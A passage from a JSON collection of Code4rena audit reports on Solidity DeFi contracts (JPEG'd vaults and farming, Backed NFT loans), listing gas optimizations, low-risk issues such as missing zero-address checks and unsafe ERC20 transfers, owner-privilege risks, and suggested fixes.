`LPFarming::claimAll()`.\n```solidity=347\nfunction claimAll() external nonReentrant noContract(msg.sender) {\n    uint256 len = poolInfo.length;\n    for (uint256 i = 0; i < len; ++i) {\n        _updatePool(i);\n        _withdrawReward(i);\n    }\n```\nSimilar changes apply for the rest of the for-loops listed above.\n\n### 3. Use != 0 instead of > 0 for Unsigned Integer Comparison.\n#### Impact\n!= 0 is cheapear than > 0 when comparing unsigned integers.\n\n#### Proof of Concept\n[`LPFarming.sol#L114`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L114), [`LPFarming.sol#L218`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L218), [`LPFarming.sol#L239`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L239), [`LPFarming.sol#L320`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L320), [`LPFarming.sol#L337`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L337), [`LPFarming.sol#L354`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L354), [`yVaultLPFarming.sol#L84`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L84), [`yVaultLPFarming.sol#L101`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L101), [`yVaultLPFarming.sol#L118`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L118), [`yVaultLPFarming.sol#L139`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L139), [`yVaultLPFarming.sol#L181`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L181), [`JPEGLock.sol#L40`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/lock/JPEGLock.sol#L40), [`JPEGStaking.sol#L32`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/staking/JPEGStaking.sol#L32), [`JPEGStaking.sol#L46`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/staking/JPEGStaking.sol#L46), [`FungibleAssetVaultForDAO.sol#L142`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L142), [`FungibleAssetVaultForDAO.sol#L164`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L164), [`FungibleAssetVaultForDAO.sol#L180`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L180), [`FungibleAssetVaultForDAO.sol#L194`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L194), [`NFTVault.sol#L278`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L278), [`NFTVault.sol#L365`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L365), [`NFTVault.sol#L637`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L637), [`NFTVault.sol#L687`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L687), [`NFTVault.sol#L764`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L764), [`NFTVault.sol#L770`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L770), [`NFTVault.sol#L882`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L882), [`NFTVault.sol#L926`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L926), [`StrategyPUSDConvex.sol#L322`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L322), [`StrategyPUSDConvex.sol#L334`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L334), [`yVault.sol#L143`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L143), [`yVault.sol#L167`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L167), [`yVault.sol#L170`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L170).\n#### Recommendation\nUse `!= 0` instead of `> 0`. \n### 4. Revert Strings > 32bytes. \n#### Impact\nRevert strings > 32bytes use more gas.\n#### Proof of Concept\n[`JPEG.sol#L23`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/JPEG.sol#L23), [`StableCoin.sol#L41`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/StableCoin.sol#L41), [`StableCoin.sol#L55`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/StableCoin.sol#L55), [`StableCoin.sol#L69`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/StableCoin.sol#L69), [`NFTVault.sol#L394`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L394).\n#### Recommendation\nMake revert strings are <= 32bytes.\n### 5. Functions can be external\n#### Impact\n`public` functions that are never called by the contract should be declared `external` to save gas.\n#### Proof of Concept\n[`Controller.sol#L151`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/Controller.sol#L151), [`yVault.sol#L115`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L115).\n#### Recommendation\n```\nwithdraw(IERC20,uint256) should be declared external:\n        - Controller.withdraw(IERC20,uint256) (contracts/vaults/yVault/Controller.sol#151-154)\nsetFarmingPool(address) should be declared external:\n        - YVault.setFarmingPool(address) (contracts/vaults/yVault/yVault.sol#115-118)\n```\n\n\n### 6. No need to initialize variables with default values\n#### Impact\nIf a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). Explicitly initializing it with its default value is an anti-pattern and wastes gas.\n#### Proof of Concept\n[`FungibleAssetVaultForDAO.sol#L45`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L45), [`LPFarming.sol#L348`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L348), [`NFTVault.sol#L181`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L181), [`NFTVault.sol#L184`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L184), [`StrategyPUSDConvex.sol#L145`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L145), [`StrategyPUSDConvex.sol#L319`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L319).\n#### Recommendation\nRemove explicit zero initialization.\n### 7. Unnecessary variable assignment.\n#### Impact\nIn `NFTVault::borrow()`, since a new uint256 variable `feeAmount` is set to equal `organizationFee` and `organizationFee` does not get updated after, there is no reason to use `feeAmount` when you can just use `organizationFee`. Waste of gas.\n#### Proof of Concept\n[`NFTVault.sol#L713-L717`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L713-L717)\n#### Recommendation\nGet rid of `feeAmount` and use `organizationFee` instead.\n#### Tools used\nc4rena, manual, slither.",
    "dataSource": {
      "name": "code-423n4/2022-04-jpegd-findings",
      "repo": "https://github.com/code-423n4/2022-04-jpegd-findings",
      "url": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/185"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n## Low\n### 1. Lack of Zero Address Check\n#### Proof of Concept\n[`StrategyPUSDConvex.sol#L303-L307`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L303-L307). \n```solidity=303\nfunction withdrawJPEG(address _to) external onlyController {\n    // claim from convex rewards pool\n    convexConfig.baseRewardPool.getReward(address(this), true);\n    jpeg.safeTransfer(_to, jpeg.balanceOf(address(this)));\n}\n```\nConsider adding `require(_to != address(0), \"INVALID: 0\");` to prevent accidental loss of funds.\n\n### 2. Unsafe ERC20 Operations\nNot consitently using safetransfers. Some cases of `transfer` and `transferFrom` without checking return value. \n\n#### Proof of Concept\n[`JPEGStaking.sol#L34`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/staking/JPEGStaking.sol#L34), [`JPEGStaking.sol#L52`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/staking/JPEGStaking.sol#L52), [`NFTVault.sol#L560`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L560), [`NFTVault.sol#L899`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L899).\n\nUse `safeTransfer` and `safeTransferFrom` from OpenZeppelin's library.\n\n### 3. Do not use Deprecated Library Functions\n\n`_setupRole` function is deprecated in favor of `_grantRole`.\nhttps://docs.openzeppelin.com/contracts/4.x/api/access\n\n#### Proof of Concept\n[`JPEG.sol#L17`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/JPEG.sol#L17), [`StableCoin.sol#L26`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/tokens/StableCoin.sol#L26), [`FungibleAssetVaultForDAO.sol#L75`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L75), [`NFTVault.sol#L153`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L153), [`Controller.sol#L26`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/Controller.sol#L26), [`StrategyPUSDConvex.sol#L152`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L152).\n\n## Non-Critical\n\n### 1. Typo \n[`NFTVault.sol#L129`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L129)\n```solidity=129\n/// @param _nftContract The NFT contrat address. It could also be the address of an helper contract\n```\nChange `contrat` to `contract`.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-jpegd-findings",
      "repo": "https://github.com/code-423n4/2022-04-jpegd-findings",
      "url": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/183"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low Risk Issues\n\n### Loans can be created and paid with non-existent/destructed tokens\n`@rari-capital/solmate/src/utils/SafeTransferLib.sol` has functions named similarly to functions that OpenZeppelin has, but they act differently. At the top of the file is the following comment:\n```solidity\n/// @dev Note that none of the functions in this library check that a token has code at all! That responsibility is delegated to the caller.\n```\nhttps://github.com/Rari-Capital/solmate/blob/4eaf6b68202e36f67cab379768ac6be304c8ebde/src/utils/SafeTransferLib.sol#L9\n\nIf the caller of these functions does not check that the token has code, calls to these functions will be no-ops, since low level calls to non-contracts always return success. There are many instances of these calls throughout the file with no code existence checks:\n```\ncontracts/NFTLoanFacilitator.sol:155:            ERC20(loanAssetContractAddress).safeTransferFrom(msg.sender, address(this), amount);\ncontracts/NFTLoanFacilitator.sol:157:            ERC20(loanAssetContractAddress).safeTransfer(\ncontracts/NFTLoanFacilitator.sol:200:                ERC20(loanAssetContractAddress).safeTransferFrom(\ncontracts/NFTLoanFacilitator.sol:205:                ERC20(loanAssetContractAddress).safeTransfer(\ncontracts/NFTLoanFacilitator.sol:210:                ERC20(loanAssetContractAddress).safeTransfer(\ncontracts/NFTLoanFacilitator.sol:215:                ERC20(loan.loanAssetContractAddress).safeTransferFrom(\ncontracts/NFTLoanFacilitator.sol:241:        ERC20(loan.loanAssetContractAddress).safeTransferFrom(msg.sender, lender, interest + loan.loanAmount);\ncontracts/NFTLoanFacilitator.sol:242:        IERC721(loan.collateralContractAddress).safeTransferFrom(\ncontracts/NFTLoanFacilitator.sol:262:        IERC721(loan.collateralContractAddress).safeTransferFrom(\ncontracts/NFTLoanFacilitator.sol:297:        ERC20(asset).safeTransfer(to, amount);\n```\n\n### `originationFeeRate`s of less than 1000 may charge no fees if amounts are small\n1. File: contracts/NFTLoanFacilitator.sol (line [156](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L156))\n```solidity\n            uint256 facilitatorTake = amount * originationFeeRate / SCALAR;\n```\nAdd a `require()` for `facilitatorTake` to be non-zero if `originationFeeRate` is non-zero, or state the fee logic for small amounts\n\n### A malicious owner can keep the fee rate at zero, but if a large value transfer enters the mempool, the owner can jack the rate up to the maximum\n1. File: contracts/NFTLoanFacilitator.sol (lines [306-312](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L306-L312))\n```solidity\n    function updateOriginationFeeRate(uint32 _originationFeeRate) external onlyOwner {\n        require(_originationFeeRate <= 5 * (10 ** (INTEREST_RATE_DECIMALS - 2)), \"NFTLoanFacilitator: max fee 5%\");\n        \n        originationFeeRate = _originationFeeRate;\n\n        emit UpdateOriginationFeeRate(_originationFeeRate);\n    }\n```\nStore the fee rate during loan creation, along with the maximum fee rate the user will allow, and update to the new rate for that particular loan only when loans are bought out\n\n### A malicious owner can set an effectively infinite improvement rate with `type(uint256).max` after he/she has entered into a loan to prevent others from buying them out\n1. File: contracts/NFTLoanFacilitator.sol (lines [320-326](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L320-L326))\n```solidity\n    function updateRequiredImprovementRate(uint256 _improvementRate) external onlyOwner {\n        require(_improvementRate > 0, 'NFTLoanFacilitator: 0 improvement rate');\n\n        requiredImprovementRate = _improvementRate;\n\n        emit UpdateRequiredImprovementRate(_improvementRate);\n    }\n```\nHave a sane upper limit to the improvement rate, and don't allow it to change as above\n\n### `tokenURI()` reverts for tokens that don't implement `IERC20Metadata`\nWhile the ticket descriptors are not in scope, the code calling them is. `NFTLoanTicket.tokenURI()`, which is in scope, ends up calling descriptor code which casts the asset to `IERC20Metadata`. This interface is separate from `IERC20` because EIP-20 does not require those functions to exist. If a valid ERC20 token does not implement this interface, casting it and attempting to call non-existant functions will cause the code to revert, which will cause `tokenURI()` to revert.\nhttps://github.com/code-423n4/2022-04-backed/blob/d34ddbdaf8d1bc1bf17446df830db629ee551308/contracts/descriptors/libraries/PopulateSVGParams.sol#L65\nhttps://github.com/code-423n4/2022-04-backed/blob/d34ddbdaf8d1bc1bf17446df830db629ee551308/contracts/descriptors/libraries/PopulateSVGParams.sol#L69\nhttps://github.com/code-423n4/2022-04-backed/blob/d34ddbdaf8d1bc1bf17446df830db629ee551308/contracts/descriptors/libraries/PopulateSVGParams.sol#L83\nUse [`safeDecimals()`](https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L33-L55) etc\n\n### `_safeMint()` should be used rather than `_mint()` wherever possible\n`_mint()` is [discouraged](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/d4d8d2ed9798cc3383912a23b5e8d5cb602f7d4b/contracts/token/ERC721/ERC721.sol#L271) in favor of `_safeMint()` which ensures that the recipient is either an EOA or implements `IERC721Receiver`. Both open [OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/d4d8d2ed9798cc3383912a23b5e8d5cb602f7d4b/contracts/token/ERC721/ERC721.sol#L238-L250) and [solmate](https://github.com/Rari-Capital/solmate/blob/4eaf6b68202e36f67cab379768ac6be304c8ebde/src/tokens/ERC721.sol#L180) have versions of this function so that NFTs aren't lost if they're minted to contracts that cannot transfer them back out.\n\n1. File: contracts/NFTLoanTicket.sol (line [34](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanTicket.sol#L34))\n```solidity\n        _mint(to, tokenId);\n```\n\n### `loanFacilitatorTransfer()` does not verify that the receiver is capable of handling an NFT\nEIP-721 states:\n```solidity\n    /// @notice Transfer ownership of an NFT -- THE CALLER IS RESPONSIBLE\n    ///  TO CONFIRM THAT `_to` IS CAPABLE OF RECEIVING NFTS OR ELSE\n    ///  THEY MAY BE PERMANENTLY LOST\n```\nhttps://github.com/ethereum/EIPs/blob/904be2534386631358766607f4a098e11a401e95/EIPS/eip-721.md?plain=1#L103-L105\n\nThe code below was copied from `transferFrom()`, so any function calling `_transfer()` needs to confirm that `to` is capable of receiving NFTs. `loanFacilitatorTransfer()` calls `_transfer()` without completing this check, which can lead to the loss of NFTs. Checking if the address is zero or not is not sufficient; it needs the other checks in [`safeTransferFrom()`](https://github.com/Rari-Capital/solmate/blob/4eaf6b68202e36f67cab379768ac6be304c8ebde/src/tokens/ERC721.sol#L105-L110).\n1. File: contracts/LendTicket.sol (lines [24-34](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/LendTicket.sol#L24-L34))\n```solidity\n    /// @dev exact copy of \n    /// https://github.com/Rari-Capital/solmate/blob/main/src/tokens/ERC721.sol#L69-L96\n    /// with L78 - L81 removed to enable loanFacilitatorTransfer\n    function _transfer(\n        address from,\n        address to,\n        uint256 id\n    ) internal {\n        require(from == ownerOf[id], \"WRONG_FROM\");\n\n        require(to != address(0), \"INVALID_RECIPIENT\");\n```\n\n### Missing checks for `address(0x0)` when assigning values to `address` state variables\n\n1. File: contracts/NFTLoanFacilitator.sol (line [282](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L282))\n```solidity\n        lendTicketContract = _contract;\n```\n2. File: contracts/NFTLoanFacilitator.sol (line [292](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L292))\n```solidity\n        borrowTicketContract = _contract;\n```\n\n## Non-critical Issues\n\n\n### `constant`s should be defined rather than using magic numbers\n\n1. File: contracts/NFTLoanFacilitator.sol (line [307](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L307))\n```solidity\n        require(_originationFeeRate <= 5 * (10 ** (INTEREST_RATE_DECIMALS - 2)), \"NFTLoanFacilitator: max fee 5%\");\n```\n2. File: contracts/NFTLoanFacilitator.sol (line [384](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L384))\n```solidity\n            * (perAnumInterestRate * 1e18 / 365 days)\n```\n3. File: contracts/NFTLoanFacilitator.sol (line [384](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L384))\n```solidity\n            * (perAnumInterestRate * 1e18 / 365 days)\n```\n4. File: contracts/NFTLoanFacilitator.sol (line [385](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L385))\n```solidity\n            / 1e21 // SCALAR * 1e18\n```\n\n### Typos\n\n1. File: contracts/NFTLoanFacilitator.sol (line [303](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/NFTLoanFacilitator.sol#L303))\n```solidity\n     * @notice Updates originationFeeRate the faciliator keeps of each loan amount\n```\nfaciliator\n\n2. File: contracts/interfaces/INFTLoanFacilitator.sol (line [65](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/interfaces/INFTLoanFacilitator.sol#L65))\n```solidity\n     * @param minLoanAmount mimimum loan amount\n```\nmimimum\n\n\n### NatSpec is incomplete\n\n1. File: contracts/interfaces/INFTLoanFacilitator.sol (lines [286-288](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/interfaces/INFTLoanFacilitator.sol#L286-L288))\n```solidity\n     * @param loanId The loan id\n     */\n    function totalOwed(uint256 loanId) view external returns (uint256);\n```\nMissing: `@return` \n\n2. File: contracts/interfaces/INFTLoanFacilitator.sol (lines [292-294](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/interfaces/INFTLoanFacilitator.sol#L292-L294))\n```solidity\n     * @param loanId The loan id\n     */\n    function interestOwed(uint256 loanId) view external returns (uint256);\n```\nMissing: `@return` \n\n3. File: contracts/interfaces/INFTLoanFacilitator.sol (lines [298-300](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/interfaces/INFTLoanFacilitator.sol#L298-L300))\n```solidity\n     * @param loanId The loan id\n     */\n    function loanEndSeconds(uint256 loanId) view external returns (uint256);\n```\nMissing: `@return` \n\n\n### Event is missing `indexed` fields\nEach `event` should use three `indexed` fields if there are three or more fields\n\n1. File: contracts/interfaces/INFTLoanFacilitator.sol (lines [68-77](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/interfaces/INFTLoanFacilitator.sol#L68-L77))\n```solidity\n    event CreateLoan(\n        uint256 indexed id,\n        address indexed minter,\n        uint256 collateralTokenId,\n        address collateralContract,\n        uint256 maxInterestRate,\n        address loanAssetContract,\n        uint256 minLoanAmount,\n        uint256 minDurationSeconds\n        );\n```\n2. File: contracts/interfaces/INFTLoanFacilitator.sol (lines [93-99](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/interfaces/INFTLoanFacilitator.sol#L93-L99))\n```solidity\n    event Lend(\n        uint256 indexed id,\n        address indexed lender,\n        uint256 interestRate,\n        uint256 loanAmount,\n        uint256 durationSeconds\n    );\n```\n3. File: contracts/interfaces/INFTLoanFacilitator.sol (line [145](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/interfaces/INFTLoanFacilitator.sol#L145))\n```solidity\n     event WithdrawOriginationFees(address asset, uint256 amount, address to);\n```\n4. File: contracts/interfaces/INFTLoanFacilitator.sol (line [152](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/interfaces/INFTLoanFacilitator.sol#L152))\n```solidity\n     event UpdateOriginationFeeRate(uint32 feeRate);\n```\n5. File: contracts/interfaces/INFTLoanFacilitator.sol (line [159](https://github.com/code-423n4/2022-04-backed/blob/e8015d7c4b295af131f017e646ba1b99c8f608f0/contracts/interfaces/INFTLoanFacilitator.sol#L159))\n```solidity\n     event UpdateRequiredImprovementRate(uint256 improvementRate);\n```",
    "dataSource": {
      "name": "code-423n4/2022-04-backed-findings",
      "repo": "https://github.com/code-423n4/2022-04-backed-findings",
      "url": "https://github.com/code-423n4/2022-04-backed-findings/issues/134"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas optimization report\n\n## Keep revert strings below 32 bytes\n\nStrings are stored in slots of 32 bytes, and hence the length of the revert string should be at max 32 bytes to fit inside 1 slot. If the string is just 33 bytes it will occupy 2 slots (64 bytes). Keeping the string size at 32 bytes or below will save gas on both deployment and when the revert condition is met.\n\nSince the used version of Solidity is `>=0.8.4` it would also be worth considering using [Custom Errors](https://blog.soliditylang.org/2021/04/21/custom-errors/) which is both more gas efficient and allows thorough error descriptions using [NatSpec](https://docs.soliditylang.org/en/latest/natspec-format.html).\n\nThe relevant code:\n\n```\nNFTLoanFacilitator.sol line 84:   \"NFTLoanFacilitator: cannot use tickets as collateral\"\nNFTLoanFacilitator.sol line 86:   \"NFTLoanFacilitator: cannot use tickets as collateral\"\nNFTLoanFacilitator.sol line 118:  \"NFTLoanFacilitator: borrow ticket holder only\"\nNFTLoanFacilitator.sol line 121:  \"NFTLoanFacilitator: has lender, use repayAndCloseLoan\"\nNFTLoanFacilitator.sol line 146:  \"NFTLoanFacilitator: rate too high\"\nNFTLoanFacilitator.sol line 147:  \"NFTLoanFacilitator: duration too low\"\nNFTLoanFacilitator.sol line 148:  \"NFTLoanFacilitator: amount too low\"\nNFTLoanFacilitator.sol line 171:  \"NFTLoanFacilitator: rate too high\"\nNFTLoanFacilitator.sol line 172:  \"NFTLoanFacilitator: duration too low\"\nNFTLoanFacilitator.sol line 178:  \"NFTLoanFacilitator: proposed terms must be better than existing terms\"\nNFTLoanFacilitator.sol line 189:  \"NFTLoanFacilitator: accumulated interest exceeds uint128\"\nNFTLoanFacilitator.sol line 255:  \"NFTLoanFacilitator: lend ticket holder only\"\nNFTLoanFacilitator.sol line 259:  \"NFTLoanFacilitator: payment is not late\"\nNFTLoanFacilitator.sol line 321:  \"NFTLoanFacilitator: 0 improvement rate\"\nNFTLoanFacilitator.sol line 86:\n\nNFTLoanTicket.sol line 15:        \"NFTLoanTicket: only loan facilitator\"\n```\n\n## Cache loanAmount\n\nIn the following code the variable `loanInfo[loanId].loanAmount` is read from storage 3 times (see audit-info comments), and hence should be cached so it is only read from storage once.\n\n```solidity\nfunction repayAndCloseLoan(uint256 loanId) external override notClosed(loanId) {\n        Loan storage loan = loanInfo[loanId];\n\n        uint256 interest = _interestOwed(\n            loan.loanAmount, @audit-info SLOAD1\n            loan.lastAccumulatedTimestamp,\n            loan.perAnumInterestRate,\n            loan.accumulatedInterest\n        );\n        address lender = IERC721(lendTicketContract).ownerOf(loanId);\n        loan.closed = true;\n        ERC20(loan.loanAssetContractAddress).safeTransferFrom(msg.sender, lender, interest + loan.loanAmount); @audit-info SLOAD2\n        IERC721(loan.collateralContractAddress).safeTransferFrom(\n            address(this),\n            IERC721(borrowTicketContract).ownerOf(loanId),\n            loan.collateralTokenId\n        );\n\n        emit Repay(loanId, msg.sender, lender, interest, loan.loanAmount); @audit-info SLOAD3\n        emit Close(loanId);\n    }\n```\n\nChange this into \n\n```solidity\nfunction repayAndCloseLoan(uint256 loanId) external override notClosed(loanId) {\n        Loan storage loan = loanInfo[loanId];\n        uint128 loanAmount = loan.loanAmount;\n\n        uint256 interest = _interestOwed(\n            loanAmount,\n            loan.lastAccumulatedTimestamp,\n            loan.perAnumInterestRate,\n            loan.accumulatedInterest\n        );\n        address lender = IERC721(lendTicketContract).ownerOf(loanId);\n        loan.closed = true;\n        ERC20(loan.loanAssetContractAddress).safeTransferFrom(msg.sender, lender, interest + loanAmount);\n        IERC721(loan.collateralContractAddress).safeTransferFrom(\n            address(this),\n            IERC721(borrowTicketContract).ownerOf(loanId),\n            loan.collateralTokenId\n        );\n\n        emit 